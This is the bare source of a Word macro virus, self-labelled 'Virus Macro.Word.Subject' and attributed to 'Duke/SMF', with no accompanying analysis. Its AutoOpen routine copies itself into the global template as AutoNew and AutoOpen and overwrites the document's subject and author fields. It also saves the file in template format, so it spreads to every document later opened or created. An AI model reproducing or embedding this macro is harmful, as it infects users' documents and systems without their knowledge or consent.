   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Virus Macro.Word.Subject"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim Fname$
   Dim MacName$
   On Error GoTo -1: On Error GoTo ErrorHandler

   Fname$ = WordBasic.[FileName$]()
   MacName$ = Fname$ + ":AutoOpen"

   WordBasic.FileSummaryInfo Subject:="Macro.Word.Subject"
   WordBasic.FileSummaryInfo Author:="Duke/SMF"

   WordBasic.MacroCopy MacName$, "Global:AutoNew", -1
   WordBasic.MacroCopy MacName$, "Global:AutoOpen", -1

   ErrorHandler:

   If WordBasic.IsDocumentDirty() = -1 Then
     WordBasic.MacroCopy "Global:AutoOpen", MacName$, -1
   End If
   WordBasic.FileSaveAs Format:=1
   End Sub
